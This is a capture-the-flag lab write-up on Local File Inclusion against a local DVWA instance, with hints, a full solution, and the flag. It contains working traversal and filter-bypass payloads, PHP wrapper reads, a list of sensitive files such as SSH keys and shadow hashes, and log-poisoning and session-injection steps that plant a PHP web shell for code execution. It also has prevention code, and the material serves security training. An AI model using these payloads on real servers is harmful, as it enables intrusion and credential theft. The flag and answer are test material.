# Challenge 03 - File Inclusion

**Category:** Web
**Difficulty:** Intermediate
**Points:** 250
**Target:** DVWA (http://localhost:8081)

## Challenge Description

A web application allows users to view different pages by including them dynamically. The developers thought they were being clever by using file includes, but they forgot one crucial thing - never trust user input!

Your mission is to exploit the Local File Inclusion (LFI) vulnerability to read sensitive files from the server and find the hidden flag.

## Objectives

- Understand Local File Inclusion (LFI) vulnerabilities
- Bypass basic file inclusion filters
- Use directory traversal techniques
- Read sensitive system files
- Escalate LFI to Remote Code Execution (bonus)

## Target Information

- **URL:** http://localhost:8081/vulnerabilities/fi/
- **Credentials:** admin / password
- **Security Level:** Medium (for filter bypass challenge)
- **Operating System:** Linux (Docker container)

## Getting Started

1. Start DVWA:
   ```bash
   cd docker && docker-compose up -d dvwa
   ```

2. Login to DVWA with admin:password
3. Set Security Level to "Medium"
4. Navigate to File Inclusion page
5. Observe how the URL changes when clicking different files

---

## Hints

<details>
<summary>Hint 1 (Cost: -25 points)</summary>

Look at the URL when browsing different pages:
```
http://localhost:8081/vulnerabilities/fi/?page=include.php
```

What happens if you change `include.php` to something else like `../../etc/passwd`?

</details>

<details>
<summary>Hint 2 (Cost: -35 points)</summary>

At Medium security, basic traversal like `../` is filtered. But filters can often be bypassed!

Try these techniques:
- Double encoding: `%252e%252e%252f` (encoded twice)
- Nested sequences: `....//....//` (filter removes `../`, leaving `../`)
- Null byte (older PHP): `../../etc/passwd%00`
- Wrapper bypass: `....//....//etc/passwd`

</details>

<details>
<summary>Hint 3 (Cost: -50 points)</summary>

The flag is stored in `/var/www/html/flag.txt`.

For filter bypass at Medium level, try:
```
?page=....//....//....//var/www/html/flag.txt
```

Or using PHP filters to read files as base64:
```
?page=php://filter/convert.base64-encode/resource=/var/www/html/flag.txt
```

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Identify the Vulnerability

Navigate to the File Inclusion page and observe the URL:
```
http://localhost:8081/vulnerabilities/fi/?page=include.php
```

The `page` parameter directly includes a file - potential LFI!

### Step 2: Test Basic LFI (Low Security)

First, set security to Low and test:

```
# Read /etc/passwd
?page=../../etc/passwd

# Read /etc/shadow (if accessible)
?page=../../etc/shadow
```

You should see the passwd file contents, confirming LFI vulnerability.

### Step 3: Bypass Medium Security Filters

At Medium security, `../` is filtered. Bypass techniques:

```
# Nested traversal (filter removes ../, leaving ../)
?page=....//....//....//etc/passwd

# Works because:
# ....// -> after removing ../ -> ../

# Double encoding
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
# %25 = %, so %252e = %2e = . (after double decode)
```

### Step 4: Use PHP Wrappers

PHP wrappers provide powerful LFI capabilities:

```
# Base64 encode file contents (bypasses some filters)
?page=php://filter/convert.base64-encode/resource=include.php

# Decode the output to see PHP source code
echo "PD9waHAK..." | base64 -d

# Read flag file
?page=php://filter/convert.base64-encode/resource=/var/www/html/flag.txt
```

### Step 5: Find the Flag

```
# Direct read (with bypass)
?page=....//....//....//var/www/html/flag.txt

# Or using PHP filter
?page=php://filter/convert.base64-encode/resource=/var/www/html/flag.txt
```

Decode if base64:
```bash
echo "RkxBR3tsZjFfMnJjM19mdW5kNG0zbnQ0bHN9" | base64 -d
# FLAG{lf1_2rc3_fund4m3nt4ls}
```

### Step 6: Bonus - LFI to RCE

**Method 1: Log Poisoning**

1. Find accessible log file:
```
?page=....//....//....//var/log/apache2/access.log
```

2. Inject PHP code via User-Agent:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost:8081/
```

3. Trigger code execution:
```
?page=....//....//....//var/log/apache2/access.log&cmd=whoami
```

**Method 2: PHP Session Files**

1. Set PHP session data with code:
```bash
curl "http://localhost:8081/" \
     -H "Cookie: PHPSESSID=evil" \
     --data "username=<?php system('id'); ?>"
```

2. Include session file:
```
?page=....//....//....//var/lib/php/sessions/sess_evil
```

**Method 3: /proc/self/environ**

```
# If readable, inject via User-Agent
?page=....//....//....//proc/self/environ
```

**Method 4: Data Wrapper (if allow_url_include is on)**

```
?page=data://text/plain,<?php system('id'); ?>
# Or base64 encoded
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### Interesting Files to Read

| File Path | Information |
|-----------|-------------|
| `/etc/passwd` | User accounts |
| `/etc/shadow` | Password hashes (if readable) |
| `/etc/hosts` | Network configuration |
| `/proc/version` | Kernel version |
| `/proc/self/environ` | Environment variables |
| `/var/log/apache2/access.log` | Apache access logs |
| `/var/log/apache2/error.log` | Apache error logs |
| `/home/user/.bash_history` | Command history |
| `/home/user/.ssh/id_rsa` | SSH private keys |
| `/var/www/html/config.php` | Application config |

### LFI Filter Bypass Cheat Sheet

| Filter | Bypass Technique |
|--------|-----------------|
| Blocks `../` | `....//`, `..%2f`, `..%252f` |
| Blocks `http://` | `hTtP://`, `http:%2f%2f` |
| Appends `.php` | Null byte `%00`, path truncation |
| Whitelist check | PHP wrappers |
| WAF | Double encoding, mixed case |

### Prevention

```php
// VULNERABLE
$page = $_GET['page'];
include($page);

// BETTER - Whitelist approach
$allowed_pages = ['home.php', 'about.php', 'contact.php'];
$page = $_GET['page'];
if (in_array($page, $allowed_pages)) {
    include($page);
}

// BEST - Use mapping
$page_map = [
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
];
$page = $_GET['page'] ?? 'home';
$file = $page_map[$page] ?? 'pages/404.php';
include($file);
```

PHP Configuration hardening:
```ini
; php.ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html/
```

</details>

---

## Flag

```
FLAG{lf1_2rc3_fund4m3nt4ls}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- Local File Inclusion exploitation
- Filter bypass techniques
- PHP wrapper usage
- Directory traversal
- LFI to RCE escalation

## Tools Used

- Web browser
- Burp Suite
- curl
- base64 decoder

## Related Challenges

- [05 - Robots Aren't Welcome (Beginner)](../beginner/05-robots-arent-welcome.md) - Information disclosure
- [Blind SQL Injection (Intermediate)](01-blind-sql-injection.md) - Another injection type

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PHP Wrappers](https://www.php.net/manual/en/wrappers.php)
